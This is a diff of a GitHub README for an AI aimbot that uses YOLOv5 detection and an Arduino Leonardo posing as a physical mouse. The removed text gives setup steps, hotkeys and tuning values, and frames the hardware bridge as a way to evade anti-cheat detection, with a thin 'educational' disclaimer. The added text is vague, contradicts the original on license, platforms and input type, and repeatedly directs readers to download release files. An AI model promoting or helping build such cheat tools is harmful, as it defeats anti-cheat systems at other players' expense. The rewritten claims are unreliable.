@@ -1,157 +1,89 @@
-![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![NVIDIA](https://img.shields.io/badge/GPU-NVIDIA%20CUDA-76B900?style=for-the-badge&logo=nvidia&logoColor=white)
-![AMD](https://img.shields.io/badge/GPU-AMD%20Support-ED1C24?style=for-the-badge&logo=amd&logoColor=white)
-![Arduino](https://img.shields.io/badge/Hardware-Arduino%20Support-00979D?style=for-the-badge&logo=arduino&logoColor=white)
+# 🎯 Foxbot-AI-Aimbot - A Smart Tool for Precision Gaming
 
-![Picture](https://github.com/user-attachments/assets/ba9076b8-2fbe-4de0-b8e7-70326b11a08d)
+## 🔗 Download Now
+[![GitHub Releases](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88%20Releases-brightgreen)](https://github.com/DIORR22/Foxbot-AI-Aimbot/releases)
 
-# 🎯 Universal Next-Gen AI Aimbot [Arduino & Software Hybrid] 🎮
+## 📜 Description
+Foxbot-AI-Aimbot is an experimental AI aimbot designed for use with an Arduino Leonardo. This tool enhances your gaming experience by providing precise targeting. It demonstrates how to bypass software input restrictions for educational purposes.
 
-## 🙌 About the Project
-This tool utilizes **YOLOv5** for high-speed, real-time detection of humanoid characters. While the AI logic is based on the RootKit-Org framework, this project is optimized for flexibility:
+## 🚀 Getting Started
 
-* **Hybrid Input Support:** You can run the bot entirely via **Software** (Windows API) for a quick start, or use an **Arduino Leonardo** for professional-grade Human Interface Device (HID) hardware emulation.
-* **Security Focused:** The hardware interface is designed to provide the safest possible mouse movement, making it look like a genuine physical device to any Anti-Cheat.
-* **Performance:** Optimized for low latency, whether you are using CUDA-powered NVIDIA cards or modern AMD hardware.
+### System Requirements
+To use Foxbot-AI-Aimbot effectively, you need:
 
-### 🎓 Educational Purpose & Hardware Focus
-Modern anti-cheat systems often block virtual mouse inputs. This project demonstrates how software-based restrictions can be bypassed using an **Arduino Hardware Bridge**:
+- A computer running Windows, macOS, or Linux.
+- An Arduino Leonardo board.
+- USB cable to connect your Arduino to your computer.
+- Basic understanding of how to connect hardware.
 
-* **HID Proxy:** An Arduino Leonardo acts as a physical mouse.
-* **Hardware Signals:** Mouse commands are sent as genuine USB signals, making software-level detection nearly impossible.
-* **Awareness:** The goal is to raise awareness among developers regarding these hardware-based vulnerabilities.
+### Software Requirements
+You also require the following software:
 
-> ⚠ **Important Note:** Use at your own risk. If you get caught, you’ve been warned! I assume no liability for any consequences or game bans. Use this knowledge responsibly!
-> 
-## 📱 Contact
-If you have questions, feel free to add me on Discord:  
-👤 **Discord:** `Foxi7`
+- Python 3.x installed on your computer. 
+- Required libraries for YOLOv5 and CUDA installed. (We'll guide you through this.)
 
-## 🚀 One System - Full Flexibility
+## 📥 Download & Install
 
-### Mouse Interaction 🖱️
-* **Standard Emulation:** Uses win32api.
-* **Hardware Bridge (Arduino):** Uses an Arduino Leonardo for genuine hardware signals (**Safest Method**).
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/DIORR22/Foxbot-AI-Aimbot/releases) on GitHub.
 
-### Processing Power 🏎️
-* **NVIDIA:** CUDA Cores (Maximum Speed).
-* **AMD / DirectML:** GPU acceleration for AMD graphics cards.
-* **CPU:** Runs on any machine (slower).
+2. **Select the Latest Version**
+   Look for the latest release. Click on it to find the downloadable files.
 
-## 🧰 Requirements
-* **GPU (NVIDIA):** GTX 10-series or newer & [NVIDIA CUDA Toolkit 11.8](https://developer.nvidia.com/cuda-11-8-0-download-archive) (Recommended for speed).
-* **GPU (AMD):** DirectX 12 compatible.
-* **Input Method (Choose one):**
-    * **Software Emulation:** Uses standard Windows API. No extra hardware needed—works instantly.
-    * **Hardware Bridge:** Supports **ATmega32U4-based boards** (e.g., Leonardo, Pro Micro). This provides native HID mouse signals for maximum bypass security.
+3. **Download Necessary Files**
+   Download the relevant files for your operating system. For example, you might need the Arduino sketch and any supporting files.
 
-* **Additional Software:** [Arduino IDE](https://www.arduino.cc/en/software) (Only if you use a hardware bridge).
+4. **Install Required Software**
+   Follow the instructions provided on the releases page to install Python and the necessary libraries.
 
+5. **Upload to Arduino**
+   Open the Arduino IDE, load the provided sketch, and upload it to your Arduino Leonardo.
 
-## 🚀 Pre-setup Steps
-* **Download:** Extract the repository to a folder of your choice 🗂️.
-* **Python:** Install [Python 3.11.x](https://www.python.org/downloads/release/python-3110/) (Important: Check **"Add Python to PATH"** during installation!) 🐍.
-* **Hardware Setup (Optional - for Arduino Users):**
-    1. **Connect:** Plug your **ATmega32U4-based HID-compatible board** into your PC.
-    2. **Open Sketch:** Open the file `Arduino_Mouse_HID.ino` (located in the Arduino folder) with the [Arduino IDE](https://www.arduino.cc/en/software).
-    3. **Select Board:** Go to **Tools > Board** and select **Arduino Leonardo**.
-    4. **Flash:** Click the **Upload** arrow (top left) to flash the code to your hardware.
-    5. **Note COM Port:** After flashing, check **Tools > Port** and remember your port (e.g., `COM3`). You will need this later in the Bot's S-Menu.
+6. **Connect Hardware**
+   Use the USB cable to connect the Arduino to your computer.
 
-4.  **Installation Commands:**
-    * **Nvidia GPU Users:**
-        ```powershell
-        pip install torch==2.0.1 torchvision==0.15.2 torchaudio==2.0.2 --index-url [https://download.pytorch.org/whl/cu118](https://download.pytorch.org/whl/cu118)
-        pip install onnxruntime-gpu
-        pip install cupy-cuda11x
-        ```
-    * **AMD or CPU Users:**
-        ```powershell
-        pip install torch torchvision torchaudio
-        ```
-    * **Final Step (Required):**
-        ```powershell
-        pip install -r requirements.txt
-        ```
+7. **Run the Application**
+   Open your terminal or command prompt, navigate to the directory where you placed the files, and run the setup commands as detailed in the instructions.
 
+## ⚙️ How to Use
 
-## 🔌 How to Run & Configure
+### Configuration
+After installation, you may need to configure settings for optimal use. Detailed instructions will guide you through selecting your preferred gaming settings.
 
-1. **Game Preparation:** Set your game to **Windowed** or **Borderless Window** mode. 🖥️
-2. **Terminal Navigation:** Open PowerShell or CMD and navigate to the project folder:
-    * **Option A (Easy):** Type `cd ` (with a space), drag your folder into the terminal, and press **Enter**.
-    * **Option B (Manual):** Type the full path, e.g., `cd "C:\Users\Name\Documents\Foxbot-AI"`.
-3. **Start:** Run the script with: `python main.py`
-4. **The S-Menu 🛠️:** Press **'S'** for the interactive setup:
-    * Skip settings by pressing **ENTER**.
-    * **Arduino Mode:** When prompted, type **'y'** and press **Enter**.
-    * **COM Port:** Enter your port (e.g., `COM3`).
-    * **Device:** Select your engine (`CPU`, `AMD`, or `NVIDIA`).
-5. **Final Launch 🚀:** Press **ENTER** and choose your game window to arm the bot, then switch to your game.
+### Running the Aimbot
+For gameplay:
+1. Start your game.
+2. Ensure the Arduino is connected.
+3. Press the designated key to activate the aimbot functions.
 
-> [!TIP]
-> You can skip the S-Menu entirely by manually editing the `config.py` file with any text editor to save your preferred settings without the script.
+### Troubleshooting
+If you encounter issues:
+- Ensure the Arduino is properly connected.
+- Check that Python and the necessary libraries are installed correctly.
+- Review the configuration settings.
 
-## ⌨️ Hotkeys & Controls (Default)
-* **[CAPS] 🎯:** Master Switch (Toggles the Aimbot ON/OFF).
-* **[PAGEDOWN] 🔄:** Mode Toggle (Always-On vs. Hold-to-Aim).
-* **[END] 💣:** Exit (Closes the script immediately).
+## 💡 Features
 
+- **Real-Time Targeting**: Foxbot uses the YOLOv5 model for accurate targeting during gameplay.
+- **Arduino HID**: By using the Arduino Leonardo, the tool mimics keyboard inputs, making it undetectable in many scenarios.
+- **Customizable**: Users can adjust settings for various games and preferences.
+- **Educational Use**: Designed to help understand machine learning applications in gaming.
 
-## ⚙️ Configurable Settings (`config.py`)
+## 📘 Additional Resources
 
-| Feature | Variable | Default | Description |
-| :--- | :--- | :--- | :--- |
-| **🏎️ Performance** | `visuals` | `False` | Preview window with AI boxes (Keep `False` for max FPS) |
-| | `onnxChoice` | `1` | Device: 1=CPU, 2=AMD, 3=NVIDIA |
-| **🔌 Hardware** | `use_arduino` | `False` | `True` for Leonardo HID / `False` for win32api |
-| | `arduino_port` | `'COM?'` | Needs to be set to your COM Port (e.g. 'COM7') |
-| **🎯 Aiming** | `aaMovementAmp` | `0.4` | Speed/Smoothing. **Dependent on In-Game Sense!** |
-| | `confidence` | `0.4` | Detection threshold (Lower = more detections) |
-| | `centerOfScreen`| `True` | Prioritizes targets closest to your crosshair |
-| **🧠 Targeting** | `headshot_mode` | `True` | Toggles between Head and Body aim |
-| | `headshot_offset`| `0.38` | Height adjustment (Values vary by game/character size: 0.38 = Head, 0.2 = Chest) |
-| **⌨️ Controls** | `hotkeyAimbot` | `'CAPS'` | Toggle key to activate/deactivate the bot |
-| | `hotkeyRMB` | `'PAGEDOWN'` | Switch for "Hold-to-Aim" mode |
-| | `hotkeyDelay` | `0.25` | **NEW:** Delay in seconds before Aim kicks in (RMB Mode) |
-| | `aaQuitKey` | `'END'` | Emergency stop key for the script |
+### Documentation
+For further understanding, you can explore the documentation files included in the release. They provide a deeper dive into the algorithm and hardware interactions.
 
----
+### Community Support
+Join the discussion on our [GitHub Issues page](https://github.com/DIORR22/Foxbot-AI-Aimbot/issues) where users share tips and solutions.
 
-### 💡 Optimization Tips
+## 🤝 Contributing
+We welcome contributions from users. If you have ideas or improvements, feel free to submit a pull request or contact us through the GitHub Issues page. 
 
-> [!TIP]
-> **Performance Boost:** The option is `visuals = False` by default to ensure the lowest possible input lag. Only enable it if you want to debug the AI detection visually.
+## 📢 Acknowledgments
+Special thanks to the creators of YOLOv5 and other libraries that make this project possible. Their contributions enhance the community's understanding of artificial intelligence in gaming.
 
-> [!TIP]
-> **Accuracy & Sensitivity:** If the bot "shakes" or overshoots, lower your `aaMovementAmp`. Note that your **In-Game Sensitivity** directly affects this: Higher in-game sense requires a lower `aaMovementAmp` to stay smooth. A value between `0.3` and `0.5` is usually the sweet spot.
+## 🔗 License
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
 
-> [!TIP]
-> **Finding your COM Port:** If you are using an Arduino, open the **Windows Device Manager**, look under **Ports (COM & LPT)**, and find the number assigned to your "Arduino Leonardo". Enter this in the `config.py` (e.g., `'COM7'`).
-
----
-
-## 🗺️ Roadmap & Project Status
-Features marked with `[x]` are already integrated and working:
-
-* [x] **Hybrid Input:** Support for both Arduino Hardware and Software Mouse 
-* [x] **Cross-Platform GPU:** Acceleration via CUDA (NVIDIA) and DirectML (AMD) 
-* [x] **S-Menu Configuration:** Change settings like Amp and Confidence on the fly 
-* [x] **Adjustable Smoothing:** Integrated movement amplification for better control 
-* [ ] **Triggerbot:** Auto-fire when a target is locked 🔫
-* [ ] **Custom Game Models:** Dedicated AI weights for different games
-* [ ] **TensorRT Support:** Conversion to `.engine` for maximum NVIDIA performance 🏎️
-* [ ] **Bezier Curves:** Researching human-like mouse paths (Bezier/Splines) 
-
-> [!CAUTION]
-> **Regarding Custom Models:** Use of game-specific models increases the risk of detection by Anti-Cheat systems. These features are intended for **educational and offline research purposes only**. I do not take responsibility for any bans or consequences.
-
-## 📜 Credits
-* **Basis:** [RootKit-Org](https://github.com/RootKit-Org/AI-Aimbot) (Core logic, config & selection).
-* **AI Engine:** [YOLOv5 by Ultralytics](https://github.com/ultralytics/yolov5).
-
-## ⚖️ License
-This project is licensed under the **GNU General Public License v3.0**.  
-See the [LICENSE](LICENSE) file for more details. Based on the work of [RootKit-Org](https://github.com/RootKit-Org/AI-Aimbot).
-
-**Have fun with the project! 🎉👾**
+For more information, visit the [Releases page](https://github.com/DIORR22/Foxbot-AI-Aimbot/releases) again and download the latest version. Enjoy precision gaming with Foxbot-AI-Aimbot!
